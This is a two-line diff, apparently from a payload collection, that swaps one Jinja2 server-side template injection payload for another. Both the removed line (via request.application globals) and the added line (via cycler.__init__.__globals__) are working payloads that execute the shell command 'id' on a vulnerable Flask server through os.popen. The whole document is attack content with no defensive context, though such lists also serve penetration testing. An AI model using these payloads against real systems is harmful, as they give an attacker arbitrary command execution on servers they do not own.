@@ -1,2 +1,2 @@
-# Command injection when using Jinja with Flask
-{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}
+# Execute command
+{{cycler.__init__.__globals__.os.popen("id").read()}}
